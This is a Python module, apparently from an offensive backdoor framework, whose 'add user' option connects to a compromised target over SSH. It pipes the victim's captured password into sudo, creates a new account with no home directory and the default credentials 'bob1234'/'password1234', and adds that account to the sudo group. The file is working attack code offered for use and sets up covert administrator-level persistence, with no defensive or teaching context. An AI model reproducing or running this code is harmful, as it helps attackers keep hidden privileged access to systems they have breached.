from backdoor import *

class User(Backdoor):
    prompt = Fore.RED + "(user) " + Fore.BLUE + ">> " + Fore.RESET

    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using add user auxiliary module"
        self.core = core
        self.options = {
                "name"   : Option("name", "bob1234", "name of new user", True),
                "password" : Option("password", "password1234", "password of new user", True),
                }
        self.allow_modules = True
        self.modules = {}
        self.help_text = INFO + "Adds a new user to the target."

    def get_command(self):
        user = self.get_value("name")
        password = self.get_value("password")
        return ("echo " + self.core.curtarget.pword + " | sudo -S useradd -M -p $(openssl passwd -1 \""+ str(password) +"\") " + str(user) + "; echo " + self.core.curtarget.pword + " | sudo -S usermod -a -G sudo " + str(user))
    
    def do_exploit(self, args):
        target = self.core.curtarget
        user = self.get_value("name")
        password = self.get_value("password")
        print(GOOD + "Creating user....")
        target.ssh.exec_command(self.get_command())
        for mod in self.modules.keys():
            print(INFO + "Attempting to execute " + mod.name + " module...")
            mod.exploit(self.get_command())
